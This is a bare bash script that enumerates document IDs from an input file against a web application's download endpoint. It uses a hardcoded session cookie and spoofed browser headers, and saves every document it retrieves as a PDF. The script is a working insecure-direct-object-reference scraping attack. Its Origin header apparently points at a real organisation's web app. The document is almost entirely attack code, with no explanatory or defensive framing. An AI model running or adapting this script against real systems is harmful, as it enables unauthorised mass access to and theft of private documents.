while read docId; do
	content=$(curl -i -s -k -X $'POST' \
    -H $'Host: target.com' -H $'Connection: close' -H $'Content-Length: 14' -H $'Cache-Control: max-age=0' -H $'Upgrade-Insecure-Requests: 1' -H $'Origin: https://webapp.peruri.co.id' -H $'Content-Type: application/x-www-form-urlencoded' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-User: ?1' -H $'Sec-Fetch-Dest: document' -H $'Referer: https://target.com/internal/archives' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9,id;q=0.8' -H $'Cookie: PHPSESSID=hecfear0pvesgg4kppu8gl6gi4' \
    -b $'PHPSESSID=hecfear0pvesgg4kppu8gl6gi4' \
    --data-binary $'requestId='"$docId" \
    $'https://target.com/download')
	if echo "$content" | grep -qi "HTTP/1.1 302 Found"; then
		echo "try $docId"
		continue
	else
		echo "Found docId $docId"‎
		curl -i -s -k -X $'POST' \
    -H $'Host: target.com' -H $'Connection: close' -H $'Content-Length: 14' -H $'Cache-Control: max-age=0' -H $'Upgrade-Insecure-Requests: 1' -H $'Origin: https://webapp.peruri.co.id' -H $'Content-Type: application/x-www-form-urlencoded' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-User: ?1' -H $'Sec-Fetch-Dest: document' -H $'Referer: https://target.com/internal/archives' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9,id;q=0.8' -H $'Cookie: PHPSESSID=hecfear0pvesgg4kppu8gl6gi4' \
    -b $'PHPSESSID=hecfear0pvesgg4kppu8gl6gi4' \
    --data-binary $'requestId='"$docId" \
    $'https://target.com/download' > ${docId:0:-1}.pdf
	fi
	done <$1
